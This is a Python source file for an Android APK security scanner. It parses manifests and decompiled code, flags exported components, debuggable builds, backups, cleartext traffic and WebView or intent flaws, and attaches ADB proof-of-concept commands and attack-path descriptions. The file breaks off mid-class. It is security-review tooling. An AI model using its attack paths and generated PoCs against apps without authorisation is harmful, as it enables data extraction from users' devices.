"""APK vulnerability scanner using pattern-based detection."""

import os
import xml.etree.ElementTree as ET
from typing import List, Optional, Dict, Any

from .patterns import PatternManager, PatternConfig
from .patterns.models import VulnerabilityPattern, DetectionType, Severity
from .utils import Evidence, Finding, find_line_snippet, iter_source_files, read_text

# Deep analysis imports
from .deep_analysis.engine import DeepAnalysisEngine, enrich_finding_with_deep_analysis
from .deep_analysis.webview import WebViewAnalyzer
from .deep_analysis.intent import IntentAnalyzer
from .deep_analysis.provider import ContentProviderAnalyzer

# Exploitability validation
from .exploitability import ExploitabilityValidator, filter_false_positives

# Reachability analysis for specific PoCs
from .analysis.reachability import ReachabilityAnalyzer

# Attack vector descriptions
from .analysis.attack_vectors import get_attack_description

# Code classification + finding enrichment (reviewer-grade context)
from .code_filter import classify_path, is_library_code, is_obfuscated_code
from .finding_enrichment import enrich_findings, group_findings_by_class

ANDROID_NS = "http://schemas.android.com/apk/res/android"

# ── False-positive reduction constants ────────────────────────────────────────

# System broadcasts that can only be sent by the OS (Android 3.1+).
# A receiver that only handles these cannot be triggered by a third-party app,
# so we skip the "exported without permission" finding for it.
_SYSTEM_ONLY_BROADCAST_ACTIONS: frozenset = frozenset({
    "android.intent.action.BOOT_COMPLETED",
    "android.intent.action.LOCKED_BOOT_COMPLETED",
    "android.net.conn.CONNECTIVITY_CHANGE",
    "android.net.wifi.WIFI_STATE_CHANGED",
    "android.intent.action.SCREEN_ON",
    "android.intent.action.SCREEN_OFF",
    "android.intent.action.BATTERY_CHANGED",
    "android.intent.action.BATTERY_LOW",
    "android.intent.action.BATTERY_OKAY",
    "android.intent.action.POWER_CONNECTED",
    "android.intent.action.POWER_DISCONNECTED",
    "android.intent.action.TIME_TICK",
    "android.intent.action.TIME_CHANGED",
    "android.intent.action.TIMEZONE_CHANGED",
    "android.intent.action.PACKAGE_ADDED",
    "android.intent.action.PACKAGE_CHANGED",
    "android.intent.action.PACKAGE_REMOVED",
    "android.intent.action.PACKAGE_REPLACED",
    "android.intent.action.MY_PACKAGE_REPLACED",
    "android.intent.action.INPUT_METHOD_CHANGED",
    "android.intent.action.USER_PRESENT",
    "android.hardware.action.NEW_PICTURE",
    "android.hardware.action.NEW_VIDEO",
    "com.google.android.gms.auth.api.phone.SMS_RETRIEVED",
    "com.google.firebase.messaging.MESSAGING_EVENT",
    "com.google.firebase.iid.TOKEN_REFRESH",
})

# Standard file/share/view intent actions.  Components registered for these
# are expected to be callable from other apps (that's the whole point).
# We still flag them but at Medium rather than High.
_STANDARD_SHARE_VIEW_ACTIONS: frozenset = frozenset({
    "android.intent.action.VIEW",
    "android.intent.action.SEND",
    "android.intent.action.SEND_MULTIPLE",
    "android.intent.action.SENDTO",
    "android.intent.action.PICK",
    "android.intent.action.GET_CONTENT",
    "android.intent.action.OPEN_DOCUMENT",
    "android.intent.action.CREATE_DOCUMENT",
    "android.intent.action.CHOOSER",
    "android.intent.action.EDIT",
    "android.intent.action.DELETE",
    "android.intent.action.SEARCH",
    "android.intent.action.WEB_SEARCH",
    "android.media.action.IMAGE_CAPTURE",
    "android.media.action.VIDEO_CAPTURE",
    "android.intent.action.DIAL",
    "android.intent.action.CALL",
    "android.intent.action.SHARE",
    "android.intent.action.PROCESS_TEXT",
})

# Test-directory path markers — findings inside these dirs are not production.
_TEST_PATH_MARKERS: tuple = (
    "/test/", "\\test\\",
    "/androidTest/", "\\androidTest\\",
    "/androidtest/", "\\androidtest\\",
    "/unitTest/", "\\unitTest\\",
    "/integrationTest/", "\\integrationTest\\",
)


class Scanner:
    """
    Scans decompiled APK for security vulnerabilities.
    Uses PatternManager for dynamic pattern loading.
    """

    def __init__(
        self,
        decompiled_dir: str,
        adb_path: str,
        pattern_config: Optional[PatternConfig] = None,
        deep_analysis: bool = True,
        skip_library_code: bool = True,
        use_semgrep: bool = True,
    ):
        self.decompiled_dir = decompiled_dir
        self.adb_path = adb_path
        self.package_name: Optional[str] = None
        self._pattern_manager = PatternManager(pattern_config)
        self.deep_analysis_enabled = deep_analysis
        self.skip_library_code = skip_library_code
        self.use_semgrep = use_semgrep
        self.manifest_data: Dict[str, Any] = {}
        # Stats about file classification
        self.scan_stats: Dict[str, int] = {
            "app_files": 0, "library_files": 0, "obfuscated_files": 0,
            "manifest_files": 0, "resource_files": 0,
        }

        # Deep analyzers (initialized after manifest parsing)
        self._deep_engine: Optional[DeepAnalysisEngine] = None
        self._webview_analyzer: Optional[WebViewAnalyzer] = None
        self._intent_analyzer: Optional[IntentAnalyzer] = None
        self._provider_analyzer: Optional[ContentProviderAnalyzer] = None

        # Exploitability validator (initialized after manifest parsing)
        self._exploitability_validator: Optional[ExploitabilityValidator] = None

    def scan(self) -> List[Finding]:
        """Run full security scan on decompiled APK."""
        findings: List[Finding] = []

        # Load patterns
        self._pattern_manager.load_all()

        manifest_path = self._find_manifest()
        if manifest_path:
            findings.extend(self._scan_manifest(manifest_path))

        sources_root = self._find_sources_dir()

        # Initialize deep analysis engines after manifest parsing
        if self.deep_analysis_enabled and self.manifest_data:
            self._init_deep_analyzers(sources_root or self.decompiled_dir)

        # Initialize exploitability validator
        if self.manifest_data and sources_root:
            try:
                self._exploitability_validator = ExploitabilityValidator(
                    self.manifest_data,
                    self.package_name or '',
                    sources_root
                )
            except Exception as e:
                print(f"[!] Exploitability validator init warning: {e}")

        if sources_root:
            findings.extend(self._scan_sources(sources_root))

            # Run deep analysis if enabled
            if self.deep_analysis_enabled:
                deep_findings = self._run_deep_analysis(sources_root)
                findings.extend(deep_findings)

            # Optional Semgrep pass — runs BEFORE exploitability filter so
            # semgrep findings are also subject to reachability validation
            if self.use_semgrep:
                try:
                    from .semgrep_runner import run as _semgrep_run, is_available as _sg_avail
                    if _sg_avail():
                        print("[*] Running Semgrep analysis…")
                        semgrep_findings = _semgrep_run(sources_root)
                        if semgrep_findings:
                            print(f"[+] Semgrep found {len(semgrep_findings)} additional findings")
                        findings.extend(semgrep_findings)
                except Exception as e:
                    print(f"[!] Semgrep integration warning: {e}")

        # Filter false positives and enrich with concrete attack paths
        if self._exploitability_validator:
            findings = filter_false_positives(findings, self._exploitability_validator)

        # Deduplicate by (rule_id, file, line)
        findings = self._deduplicate_findings(findings)

        # Group multiple matches in the same class into a single finding
        findings = group_findings_by_class(findings)

        # Run reachability analysis to generate specific PoCs
        findings = self._enrich_with_reachability(findings)

        # Add reviewer context (why_it_matters / how_to_verify / code_analysis / fp_check)
        findings = enrich_findings(findings, self.package_name or "")

        # Sort: high-confidence + high-priority first
        findings.sort(key=self._finding_sort_key)

        return findings

    def _finding_sort_key(self, finding: Finding) -> tuple:
        """Sort key: severity tier → reviewer priority → confidence → title."""
        sev_order = {"Critical": 0, "High": 1, "Medium": 2, "Low": 3, "Info": 4}
        extra = finding.extra or {}
        sev = sev_order.get(finding.severity, 5)
        priority = extra.get("reviewer_priority", 4) if isinstance(extra, dict) else 4
        conf_order = {"high": 0, "medium": 1, "low": 2}
        conf = conf_order.get(extra.get("confidence", "medium") if isinstance(extra, dict) else "medium", 1)
        return (sev, conf, priority, finding.title or "")

    def _init_deep_analyzers(self, sources_root: str):
        """Initialize deep analysis engines."""
        try:
            self._deep_engine = DeepAnalysisEngine(sources_root, self.manifest_data)
            self._webview_analyzer = WebViewAnalyzer(sources_root, self.manifest_data)
            self._intent_analyzer = IntentAnalyzer(sources_root, self.manifest_data)
            self._provider_analyzer = ContentProviderAnalyzer(sources_root, self.manifest_data)
        except Exception as e:
            print(f"[!] Deep analysis init warning: {e}")

    def _enrich_with_reachability(self, findings: List[Finding]) -> List[Finding]:
        """Enrich findings with specific PoCs from reachability analysis and attack descriptions."""
        try:
            analyzer = ReachabilityAnalyzer(self.decompiled_dir)
            reachability_results = analyzer.analyze()

            # Build a map of component name to reachability data
            component_pocs = {}
            for name, result in reachability_results.items():
                if result.adb_commands:
                    component_pocs[name] = result

            # Enrich findings with specific PoCs and attack descriptions
            for finding in findings:
                # Try to match finding to a component
                matched_component = None
                component_type = None

                # Check evidence file path for component name
                if finding.evidence and finding.evidence.file_path:
                    file_name = os.path.basename(finding.evidence.file_path)
                    class_name = file_name.replace('.java', '').replace('.kt', '')

                    # Try to find matching component
                    for comp_name in component_pocs:
                        if class_name in comp_name or comp_name.endswith('.' + class_name):
                            matched_component = comp_name
                            break

                # Check extra dict for component info
                if not matched_component and finding.extra:
                    comp_from_extra = finding.extra.get('component', '') or finding.extra.get('activity', '')
                    if comp_from_extra:
                        for comp_name in component_pocs:
                            if comp_from_extra in comp_name or comp_name.endswith(comp_from_extra):
                                matched_component = comp_name
                                break

                # Determine component type from finding
                fid_lower = finding.fid.lower() if finding.fid else ''
                title_lower = finding.title.lower() if finding.title else ''
                if 'activity' in fid_lower or 'activity' in title_lower:
                    component_type = 'activity'
                elif 'provider' in fid_lower or 'provider' in title_lower:
                    component_type = 'provider'
                elif 'receiver' in fid_lower or 'broadcast' in title_lower:
                    component_type = 'receiver'
                elif 'service' in fid_lower or 'service' in title_lower:
                    component_type = 'service'

                # If we found a matching component, use its specific PoCs
                if matched_component and matched_component in component_pocs:
                    result = component_pocs[matched_component]

                    # Replace generic PoCs with specific ones
                    if result.adb_commands:
                        finding.adb_commands = result.adb_commands

                    # Add deep links to extra
                    if result.deep_links:
                        if not finding.extra:
                            finding.extra = {}
                        finding.extra['deep_links'] = result.deep_links

                    # Add attack scenarios
                    if result.attack_scenarios:
                        if not finding.extra:
                            finding.extra = {}
                        finding.extra['attack_scenarios'] = result.attack_scenarios

                    # Add entry points
                    if result.entry_points:
                        if not finding.extra:
                            finding.extra = {}
                        finding.extra['entry_points'] = result.entry_points

                # Get attack vector description for this finding
                attack_info = get_attack_description(
                    finding.fid or '',
                    finding.title or '',
                    component_type
                )

                if attack_info and attack_info.get('attack_vector'):
                    if not finding.extra:
                        finding.extra = {}

                    # Add attack vector details to finding
                    finding.extra['attack_vector'] = attack_info['attack_vector']
                    finding.extra['attack_description'] = attack_info['description']
                    finding.extra['attack_prerequisites'] = attack_info['prerequisites']
                    finding.extra['attack_steps'] = attack_info['attack_steps']
                    finding.extra['attack_impact'] = attack_info['impact']
                    finding.extra['malicious_apk_code'] = attack_info['malicious_apk_code']
                    finding.extra['deep_link_exploit'] = attack_info['deep_link_exploit']
                    finding.extra['mitigation'] = attack_info['mitigation']

        except Exception as e:
            print(f"[!] Reachability analysis warning: {e}")

        return findings

    def _run_deep_analysis(self, sources_root: str) -> List[Finding]:
        """Run deep analysis on source files for comprehensive vulnerability detection."""
        findings: List[Finding] = []

        if not self._webview_analyzer:
            return findings

        # Track files already processed to avoid duplicates
        processed_files = set()

        for path in iter_source_files(sources_root):
            if path in processed_files:
                continue
            processed_files.add(path)

            # Skip library / obfuscated dependency code
            if self.skip_library_code and classify_path(path) in ("library", "obfuscated"):
                continue

            try:
                # WebView deep analysis
                webview_findings = self._webview_analyzer.analyze_file(path)
                for wv_finding in webview_findings:
                    for vuln in wv_finding.vulnerabilities:
                        evidence = Evidence(
                            file_path=path,
                            line_number=vuln.get('line', 0),
                            snippet=vuln.get('description', ''),
                            matched_text=vuln.get('title', ''),
                        )

                        findings.append(Finding(
                            fid=f"deep-webview-{vuln['type']}:{path}:{vuln.get('line', 0)}",
                            title=f"[Deep Analysis] {vuln['title']}",
                            severity=vuln['severity'],
                            description=vuln['description'],
                            attack_path=self._format_attack_chains(wv_finding.attack_chains),
                            adb_commands=[wv_finding.deep_poc],
                            evidence=evidence,
                            references=["https://developer.android.com/develop/ui/views/layout/webapps/webview"],
                            extra={
                                "deep_analysis": True,
                                "risk_score": wv_finding.risk_score,
                                "webview_config": {
                                    "js_enabled": wv_finding.webview.settings.javascript_enabled,
                                    "file_access": wv_finding.webview.settings.file_access,
                                    "universal_access": wv_finding.webview.settings.universal_file_access,
                                    "ssl_bypass": wv_finding.webview.ssl_bypass,
                                    "js_interfaces": len(wv_finding.webview.js_interfaces),
                                },
                                "controllable_urls": sum(1 for l in wv_finding.webview.load_calls if l.controllable),
                            },
                        ))

                # Intent deep analysis
                if self._intent_analyzer:
                    intent_finding = self._intent_analyzer.analyze_file(path)
                    if intent_finding and (intent_finding.data_usages or
                                          intent_finding.pending_intent_vulns or
                                          intent_finding.redirect_vulns):
                        for usage in intent_finding.data_usages:
                            for u in usage.usages:
                                if u.is_dangerous:
                                    evidence = Evidence(
                                        file_path=path,
                                        line_number=u.line_number,
                                        snippet=u.code_snippet,
                                        matched_text=usage.extra_name,
                                    )

                                    findings.append(Finding(
                                        fid=f"deep-intent-{u.usage_type}:{path}:{u.line_number}",
                                        title=f"[Deep Analysis] Intent Data → {u.usage_type}",
                                        severity="Critical" if intent_finding.is_exported else "High",
                                        description=f"Intent extra '{usage.extra_name}' flows to dangerous sink: {u.danger_reason}",
                                        attack_path=intent_finding.deep_poc,
                                        adb_commands=[intent_finding.deep_poc],
                                        evidence=evidence,
                                        references=["https://developer.android.com/guide/components/intents-filters"],
                                        extra={
                                            "deep_analysis": True,
                                            "risk_score": intent_finding.risk_score,
                                            "is_exported": intent_finding.is_exported,
                                            "extra_name": usage.extra_name,
                                            "sink_type": u.usage_type,
                                        },
                                    ))

                        for vuln in intent_finding.redirect_vulns:
                            if not vuln.is_validated:
                                evidence = Evidence(
                                    file_path=path,
                                    line_number=vuln.redirect_line,
                                    snippet=f"Intent from extra '{vuln.source_extra}' redirected via {vuln.redirect_method}",
                                    matched_text=vuln.source_extra,
                                )

                                findings.append(Finding(
                                    fid=f"deep-intent-redirect:{path}:{vuln.redirect_line}",
                                    title="[Deep Analysis] Intent Redirect Vulnerability",
                                    severity="Critical" if intent_finding.is_exported else "High",
                                    description=f"Intent from extra '{vuln.source_extra}' is passed to {vuln.redirect_method}() without validation. Attacker can redirect to arbitrary components.",
                                    attack_path=intent_finding.deep_poc,
                                    adb_commands=[intent_finding.deep_poc],
                                    evidence=evidence,
                                    references=["https://blog.oversecured.com/Android-Access-to-app-protected-components/"],
                                    extra={
                                        "deep_analysis": True,
                                        "risk_score": intent_finding.risk_score,
                                        "cwe": ["CWE-940"],
                                    },
                                ))

                # Content Provider deep analysis
                if self._provider_analyzer:
                    provider_finding = self._provider_analyzer.analyze_file(path)
                    if provider_finding and provider_finding.vulnerabilities:
                        for vuln in provider_finding.vulnerabilities:
                            evidence = Evidence(
                                file_path=path,
                                line_number=vuln.get('line', 0),
                                snippet=vuln['description'],
                                matched_text=vuln['method'],
                            )

                            findings.append(Finding(
                                fid=f"deep-provider-{vuln['type']}:{path}:{vuln.get('line', 0)}",
                                title=f"[Deep Analysis] {vuln['title']}",
                                severity=vuln['severity'],
                                description=vuln['description'],
                                attack_path=provider_finding.deep_poc,
                                adb_commands=[provider_finding.deep_poc],
                                evidence=evidence,
                                references=["https://developer.android.com/guide/topics/providers/content-providers"],
                                extra={
                                    "deep_analysis": True,
                                    "risk_score": provider_finding.risk_score,
                                    "authority": provider_finding.authority,
                                    "is_exported": provider_finding.is_exported,
                                },
                            ))

            except Exception as e:
                # Continue on errors
                continue

        return findings

    def _format_attack_chains(self, chains: List[Dict]) -> str:
        """Format attack chains into readable text."""
        if not chains:
            return ""

        parts = []
        for chain in chains:
            parts.append(f"**{chain.get('name', 'Attack Chain')}**")
            for step in chain.get('steps', []):
                parts.append(f"  {step['step']}. {step['action']}")
                if step.get('detail'):
                    parts.append(f"     → {step['detail']}")
            parts.append("")

        return '\n'.join(parts)

    def _find_manifest(self) -> Optional[str]:
        """Locate AndroidManifest.xml in decompiled output."""
        candidates = [
            os.path.join(self.decompiled_dir, "resources", "AndroidManifest.xml"),
            os.path.join(self.decompiled_dir, "AndroidManifest.xml"),
        ]
        for path in candidates:
            if os.path.exists(path):
                return path
        return None

    def _find_sources_dir(self) -> Optional[str]:
        """Locate sources directory in decompiled output."""
        candidates = [
            os.path.join(self.decompiled_dir, "sources"),
            self.decompiled_dir,
        ]
        for path in candidates:
            if os.path.isdir(path):
                return path
        return None

    def _scan_manifest(self, manifest_path: str) -> List[Finding]:
        """Scan AndroidManifest.xml for security issues."""
        findings: List[Finding] = []
        try:
            tree = ET.parse(manifest_path)
            root = tree.getroot()
        except ET.ParseError:
            return findings

        self.package_name = root.attrib.get("package")

        # Build detailed manifest data for deep analysis
        self.manifest_data = self._parse_manifest_detailed(root)

        app = root.find("application")
        if app is not None:
            findings.extend(self._manifest_app_flags(app, manifest_path))
            findings.extend(self._manifest_components(root, manifest_path))

        return findings

    def _parse_manifest_detailed(self, root: ET.Element) -> Dict[str, Any]:
        """Parse manifest into detailed structure for deep analysis."""
        data = {
            'package': root.attrib.get('package', ''),
            'activities': [],
            'services': [],
            'receivers': [],
            'providers': [],
        }

        app = root.find('application')
        if app is None:
            return data

        # Parse activities
        for activity in app.findall('activity') + app.findall('activity-alias'):
            act_data = self._parse_component(activity)
            data['activities'].append(act_data)

        # Parse services
        for service in app.findall('service'):
            svc_data = self._parse_component(service)
            data['services'].append(svc_data)

        # Parse receivers
        for receiver in app.findall('receiver'):
            rcv_data = self._parse_component(receiver)
            data['receivers'].append(rcv_data)

        # Parse providers
        for provider in app.findall('provider'):
            prov_data = self._parse_component(provider)
            prov_data['authorities'] = self._get_android_attr(provider, 'authorities')
            prov_data['grantUriPermissions'] = self._get_android_attr(provider, 'grantUriPermissions') == 'true'
            prov_data['readPermission'] = self._get_android_attr(provider, 'readPermission')
            prov_data['writePermission'] = self._get_android_attr(provider, 'writePermission')
            data['providers'].append(prov_data)

        return data

    def _parse_component(self, comp: ET.Element) -> Dict[str, Any]:
        """Parse a component element into a dictionary."""
        name = self._get_android_attr(comp, 'name') or ''
        # Resolve relative names
        pkg = self.package_name or ""
        if name.startswith('.'):
            name = f"{pkg}{name}"
        elif '.' not in name and name:
            name = f"{pkg}.{name}" if pkg else name

        exported = self._get_android_attr(comp, 'exported')
        has_intent_filter = comp.find('intent-filter') is not None

        # Parse intent filters
        intent_filters = []
        for intent_filter in comp.findall('intent-filter'):
            if_data = {
                'actions': [],
                'categories': [],
                'data': [],
            }

            for action in intent_filter.findall('action'):
                action_name = self._get_android_attr(action, 'name')
                if action_name:
                    if_data['actions'].append(action_name)

            for category in intent_filter.findall('category'):
                cat_name = self._get_android_attr(category, 'name')
                if cat_name:
                    if_data['categories'].append(cat_name)

            for data_elem in intent_filter.findall('data'):
                data_attrs = {
                    'scheme': self._get_android_attr(data_elem, 'scheme'),
                    'host': self._get_android_attr(data_elem, 'host'),
                    'port': self._get_android_attr(data_elem, 'port'),
                    'path': self._get_android_attr(data_elem, 'path'),
                    'pathPrefix': self._get_android_attr(data_elem, 'pathPrefix'),
                    'pathPattern': self._get_android_attr(data_elem, 'pathPattern'),
                    'mimeType': self._get_android_attr(data_elem, 'mimeType'),
                }
                # Remove None values
                data_attrs = {k: v for k, v in data_attrs.items() if v is not None}
                if data_attrs:
                    if_data['data'].append(data_attrs)

            intent_filters.append(if_data)

        return {
            'name': name,
            'exported': exported == 'true' or (exported is None and has_intent_filter),
            'permission': self._get_android_attr(comp, 'permission'),
            'intent_filters': intent_filters,
        }

    def _manifest_app_flags(self, app: ET.Element, manifest_path: str) -> List[Finding]:
        """Check application-level security flags."""
        findings: List[Finding] = []

        debuggable = self._get_android_attr(app, "debuggable")
        if debuggable == "true":
            findings.append(
                Finding(
                    fid="manifest-debuggable",
                    title="Debuggable build enabled",
                    severity="Critical",
                    description=(
                        "The application is debuggable, allowing local debugging and inspection. "
                        "Debuggable builds enable runtime inspection, memory dumps, and data extraction."
                    ),
                    attack_path="Attacker with ADB access can attach debugger, use run-as, or extract app data.",
                    adb_commands=self._adb_commands_debuggable(),
                    evidence=self._manifest_evidence(manifest_path, "debuggable"),
                    references=["https://developer.android.com/guide/topics/manifest/application-element#debug"],
                    extra={"cwe": ["CWE-489"]},
                )
            )

        allow_backup = self._get_android_attr(app, "allowBackup")
        if allow_backup == "true":
            findings.append(
                Finding(
                    fid="manifest-allow-backup",
                    title="Android backup enabled",
                    severity="Medium",
                    description=(
                        "App explicitly sets android:allowBackup=\"true\". Data can be extracted via adb backup "
                        "and restored on another device, potentially exposing sensitive data."
                    ),
                    attack_path="Attacker with USB access runs 'adb backup' to extract databases, SharedPreferences, and files.",
                    adb_commands=self._adb_commands_backup(),
                    evidence=self._manifest_evidence(manifest_path, "allowBackup"),
                    references=["https://developer.android.com/guide/topics/data/backup"],
                    extra={"cwe": ["CWE-530"]},
                )
            )

        cleartext = self._get_android_attr(app, "usesCleartextTraffic")
        if cleartext == "true":
            findings.append(
                Finding(
                    fid="manifest-cleartext",
                    title="Cleartext traffic allowed",
                    severity="Medium",
                    description=(
                        "App permits cleartext HTTP traffic. Data sent over HTTP can be intercepted "
                        "and modified by network attackers."
                    ),
                    attack_path="Attacker on same network intercepts HTTP traffic, steals credentials, or injects content.",
                    adb_commands=self._adb_commands_cleartext(),
                    evidence=self._manifest_evidence(manifest_path, "usesCleartextTraffic"),
                    references=["https://developer.android.com/guide/topics/manifest/application-element#usesCleartextTraffic"],
                    extra={"cwe": ["CWE-319"]},
                )
            )

        return findings

    def _manifest_components(self, root: ET.Element, manifest_path: str) -> List[Finding]:
        """Check for exported components without permission protection.

        Applies intent-filter classification to reduce false positives:
        - LAUNCHER activities → Info (expected app entry point)
        - Receivers with OS-only system broadcasts → skip (not reachable by third-party apps)
        - Components with standard share/view intent actions → Medium
        - Explicitly exported without any intent filter → High (most dangerous)
        - Other exported with custom intent filters → High
        """
        findings: List[Finding] = []
        component_tags = [
            ("activity", "Activity"),
            ("activity-alias", "Activity"),
            ("service", "Service"),
            ("receiver", "BroadcastReceiver"),
            ("provider", "ContentProvider"),
        ]
        app = root.find("application")
        if app is None:
            return findings

        for tag, label in component_tags:
            for comp in app.findall(tag):
                exported = self._component_exported(comp)
                if not exported:
                    continue
                permission = self._get_android_attr(comp, "permission")
                read_perm = self._get_android_attr(comp, "readPermission")
                write_perm = self._get_android_attr(comp, "writePermission")

                if permission or (tag == "provider" and (read_perm or write_perm)):
                    continue

                comp_name = self._get_android_attr(comp, "name") or "(unknown)"
                evidence = self._manifest_evidence(manifest_path, comp_name)
                adb_commands = self._adb_commands_component(tag, comp)

                # Collect all intent-filter actions and categories
                intent_filters = comp.findall("intent-filter")
                actions: List[str] = []
                categories: List[str] = []
                for f in intent_filters:
                    for a in f.findall("action"):
                        name = self._get_android_attr(a, "name")
                        if name:
                            actions.append(name)
                    for c_elem in f.findall("category"):
                        name = self._get_android_attr(c_elem, "name")
                        if name:
                            categories.append(name)

                # ── Classification logic ───────────────────────────────────
                is_launcher = (
                    "android.intent.action.MAIN" in actions
                    and "android.intent.category.LAUNCHER" in categories
                )

                all_system_broadcasts = bool(actions) and all(
                    a in _SYSTEM_ONLY_BROADCAST_ACTIONS for a in actions
                )

                non_system_actions = [
                    a for a in actions if a not in _SYSTEM_ONLY_BROADCAST_ACTIONS
                ]
                all_standard_share_view = bool(non_system_actions) and all(
                    a in _STANDARD_SHARE_VIEW_ACTIONS for a in non_system_actions
                )

                if is_launcher:
                    # Expected entry point — still worth noting for completeness
                    findings.append(Finding(
                        fid=f"manifest-exported-{tag}-{comp_name}",
                        title=f"Launcher Activity Exported (expected entry point)",
                        severity="Info",
                        description=(
                            f"This Activity is the main launcher entry point and is intentionally "
                            "exported. Verify that it does not process dangerous Intent extras "
                            "without validation (e.g., deep-link URLs, action strings)."
                        ),
                        attack_path=(
                            "Low risk as a standalone finding. Escalates if the Activity "
                            "processes Intent extras or data URIs without input validation."
                        ),
                        adb_commands=adb_commands,
                        evidence=evidence,
                        references=["https://developer.android.com/guide/topics/manifest/activity-element#exported"],
                        extra={"component": comp_name, "cwe": ["CWE-926"]},
                    ))

                elif tag == "receiver" and all_system_broadcasts:
                    # OS-protected: third-party apps cannot send these broadcasts
                    # on Android 3.1+ (protectedBroadcast). Skip entirely.
                    continue

                elif all_standard_share_view and not is_launcher:
                    # Intentionally accessible via share/view intents — Medium risk.
                    # An attacker can craft a malicious intent, but this is expected
                    # behavior; the real risk is in how extras/data are handled.
                    findings.append(Finding(
                        fid=f"manifest-exported-{tag}-{comp_name}",
                        title=f"Exported {label} handles share/view intents — validate extras",
                        severity="Medium",
                        description=(
                            f"The {label} registers for standard share or view intents and is "
                            "reachable by any app. This is expected behavior, but the component "
                            "must validate all Intent extras and data URIs before use to prevent "
                            "intent injection attacks."
                        ),
                        attack_path=(
                            f"A malicious app sends a crafted intent to `{comp_name}` with "
                            "hostile extras (e.g., malicious URL, path traversal, XSS payload). "
                            "If extras are not validated, this can lead to open redirect, "
                            "arbitrary file access, or JavaScript execution in WebViews."
                        ),
                        adb_commands=adb_commands,
                        evidence=evidence,
                        references=["https://developer.android.com/guide/topics/manifest/activity-element#exported"],
                        extra={"component": comp_name, "cwe": ["CWE-926", "CWE-20"]},
                    ))

                elif not intent_filters:
                    # Explicitly exported=true with NO intent filter — highest risk.
                    # The developer deliberately exposed this component; any app can
                    # target it directly without needing to match an action/category.
                    findings.append(Finding(
                        fid=f"manifest-exported-{tag}-{comp_name}",
                        title=f"Explicitly Exported {label} — no intent filter (direct attack surface)",
                        severity="High",
                        description=(
                            f"The {label} has `android:exported=\"true\"` but declares no intent "
                            "filter. It was explicitly exposed and can be started directly by any "
                            "app using an explicit Intent — no action or category match required. "
                            "This is the highest-risk exported component configuration."
                        ),
                        attack_path=(
                            f"Any app (or ADB) can directly invoke `{comp_name}` with "
                            "`Intent(packageName, \"{comp_name}\")` and supply arbitrary extras. "
                            "Common exploits: privilege escalation, logic bypass, data exfiltration."
                        ),
                        adb_commands=adb_commands,
                        evidence=evidence,
                        references=["https://developer.android.com/guide/topics/manifest/activity-element#exported"],
                        extra={"component": comp_name, "cwe": ["CWE-926"]},
                    ))

                else:
                    # Exported with custom intent filters — standard High finding
                    findings.append(Finding(
                        fid=f"manifest-exported-{tag}-{comp_name}",
                        title=f"Exported {label} without permission",
                        severity="High",
                        description=(
                            f"The {label} is exported and does not require a caller permission. "
                            "Any app can send it intents matching the registered filters. "
                            "Verify that all Intent data and extras are validated before use."
                        ),
                        attack_path=(
                            f"Any app can send a matching intent to `{comp_name}`. "
                            "Craft the intent with malicious extras or data URI to trigger "
                            "intent injection, privilege escalation, or data leakage."
                        ),
                        adb_commands=adb_commands,
                        evidence=evidence,
                        references=["https://developer.android.com/guide/topics/manifest/activity-element#exported"],
                        extra={"component": comp_name, "cwe": ["CWE-926"]},
                    ))

        return findings

    def _component_exported(self, comp: ET.Element) -> bool:
        """Determine if a component is exported."""
        exported = self._get_android_attr(comp, "exported")
        if exported is not None:
            return exported == "true"
        # If no explicit exported, intent-filter implies exported
        if comp.find("intent-filter") is not None:
            return True
        return False

    def _get_android_attr(self, element: ET.Element, attr: str) -> Optional[str]:
        """Get an android: namespaced attribute."""
        return element.attrib.get(f"{{{ANDROID_NS}}}{attr}")

    def _manifest_evidence(self, manifest_path: str, token: str) -> Optional[Evidence]:
        """Extract evidence snippet from manifest."""
        try:
            text = read_text(manifest_path)
        except OSError:
            return None
        idx = text.find(token)
        if idx == -1:
            return None
        evidence = find_line_snippet(text, idx)
        evidence.file_path = manifest_path
        return evidence

    def _scan_sources(self, sources_root: str) -> List[Finding]:
        """Scan source files for vulnerability patterns."""
        findings: List[Finding] = []

        adb_map = {
            "webview": self._adb_commands_webview,
            "tls": self._adb_commands_tls,
            "logcat": self._adb_commands_logcat,
            "component": self._adb_commands_component_generic,
            "backup": self._adb_commands_backup,
            "debug": self._adb_commands_debuggable,
            "general": self._adb_commands_general_launch,
        }

        for path in iter_source_files(sources_root):
            # Classify file & track stats
            cat = classify_path(path)
            self.scan_stats[f"{cat}_files"] = self.scan_stats.get(f"{cat}_files", 0) + 1

            # Skip library and obfuscated dependency code by default — these
            # produce massive numbers of false positives that belong to the
            # library maintainer, not the app under review.
            if self.skip_library_code and cat in ("library", "obfuscated"):
                continue

            # Skip test source directories — findings there are not production code
            # and would be false positives (e.g. test helpers that deliberately use
            # raw SQL or insecure patterns to exercise vulnerability detection).
            path_norm = path.replace("\\", "/").lower()
            if any(m.replace("\\", "/").lower() in path_norm for m in _TEST_PATH_MARKERS):
                continue

            try:
                text = read_text(path)
            except OSError:
                continue

            for pattern in self._pattern_manager.get_patterns(enabled_only=True):
                if not pattern.matches_file_type(path):
                    continue

                for regex_det in pattern.get_regex_patterns():
                    try:
                        compiled = regex_det.compile()
                        for match in compiled.finditer(text):
                            # Check context requirements if present
                            if regex_det.context:
                                if not self._check_context(text, match.start(), regex_det.context):
                                    continue

                            # Skip matches on comment lines (reduces FP from doc comments)
                            if self._is_comment_line(text, match.start()):
                                continue

                            # SQL injection FP reduction: skip if selectionArgs or
                            # '?' placeholder is used nearby, indicating parameterized queries.
                            if "sql" in pattern.id.lower() and self._has_selection_args_nearby(text, match.start()):
                                continue

                            # Intent/deeplink redirect FP reduction: skip if a
                            # validation guard (whitelist, verify, isValid) is nearby.
                            if any(k in pattern.id for k in ("intent-redirect", "deeplink", "activity-result")):
                                if self._has_validation_guard_nearby(text, match.start()):
                                    continue

                            evidence = find_line_snippet(text, match.start())
                            evidence.file_path = path

                            adb_fn = adb_map.get(pattern.adb_category, self._adb_commands_general_launch)

                            findings.append(
                                Finding(
                                    fid=f"{pattern.id}:{path}:{match.start()}",
                                    title=pattern.title,
                                    severity=pattern.severity.value,
                                    description=pattern.description,
                                    attack_path=pattern.attack_path,
                                    adb_commands=adb_fn(),
                                    evidence=evidence,
                                    references=pattern.metadata.references,
                                    extra={
                                        "cwe": pattern.metadata.cwe,
                                        "cve": pattern.metadata.cve,
                                        "category": pattern.category.value,
                                        "remediation": pattern.remediation,
                                    },
                                )
                            )
                    except Exception as e:
                        # Skip invalid patterns
                        continue

        return findings

    def _check_context(self, text: str, match_pos: int, context) -> bool:
